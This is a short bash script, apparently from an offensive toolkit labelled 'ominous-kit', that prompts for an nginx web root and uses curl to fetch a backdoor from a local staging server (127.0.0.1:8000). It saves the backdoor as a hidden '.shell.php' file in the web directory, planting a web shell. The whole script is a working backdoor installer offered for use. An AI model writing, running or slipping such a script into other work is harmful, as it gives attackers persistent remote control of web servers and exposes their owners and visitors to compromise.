#!/bin/bash

#Variables
web_root="/var/www/html/"
blue="\033[01;34m"
green="\033[01;32m"
red="\033[01;31m"

read -p "Enter nginx root directory ($web_root): " directory
if [[ $directory != '' ]];then
	web_root=$directory
fi

if [[ -e "$web_root" ]];then
	if [[ -w "$web_root" ]];then
		RESPONSE=$(curl -sS http://127.0.0.1:8000/ominous-kit/backdoors/nginx/shell.py -o "$web_root.shell.php" 2>/dev/null 2>&1)
		if [[ $? == 0 ]];then
			printf "$green[+] Done.\n"
			printf "$green[+] File: $web_root\n"
		else
			printf "$red[-] Error: $RESPONSE\n"
			exit 1
		fi
	else
		printf "$red[-] Error: Directory \"$web_root\" is not writable\n"
		exit 1
	fi
else
	printf "$red[-] Error: Directory \"$web_root\" does not exist\n"
	exit 1
fi
